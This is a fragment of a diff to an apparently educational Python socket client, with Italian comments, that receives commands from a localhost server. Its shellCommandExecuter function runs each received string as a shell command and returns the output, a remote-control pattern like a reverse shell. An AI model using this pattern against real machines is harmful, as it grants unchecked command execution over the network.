@@ -53,7 +53,7 @@ def getFile(clientSocket: socket, fileName):
 
 def StartConnection():  # apre la connessione con il server
     serverName = 'localhost'
-    serverPort = 12014
+    serverPort = 12018
     clientSocket = socket(AF_INET, SOCK_STREAM)
 
     while True:
@@ -97,9 +97,14 @@ def searchCmd(clientSocket, cmd):
         return False
 
 
+
+
 def shellCommandExecuter(clientSocket, cmd):
     output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
     pSize = str(output.__sizeof__())
+
+    if output == "":
+        output = "NULL"
     clientSocket.send(pSize.encode())
     clientSocket.recv(1024)  # 87
     clientSocket.send(output.encode())  # 88
@@ -154,7 +159,7 @@ def main():
                         if windowsFlag == "w":
                             sendDir(clientSocket, "dir")
                         else:
-                            sendDir(clientSocket, "ls")
+                            sendDir(clientSocket, "ls -l")
 
                     elif "cd" in cmd:
                         changeDirectory(clientSocket, cmd)
@@ -179,8 +184,8 @@ def main():
 
                     elif "search" in cmd:
                         shellCommand = clientSocket.recv(1024).decode()  # 78
-                        if searchCmd(clientSocket, shellCommand):
-                            print("true")
+                        searchCmd(clientSocket, shellCommand)
+
 
                     elif "rf" in cmd:
                         if cmd == "rf":
